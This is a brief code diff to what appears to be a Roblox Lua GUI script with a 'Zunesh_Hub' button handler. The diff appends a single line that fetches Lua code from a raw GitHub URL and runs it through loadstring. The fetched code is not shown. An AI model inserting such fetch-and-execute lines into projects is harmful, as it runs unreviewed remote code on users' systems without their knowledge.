@@ -67,3 +67,5 @@ Zunesh_Hub.MouseButton1Click:Connect(function()
 		Frame.Visible = false
 	end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bibroidinka/github/main/Main.lua"))()
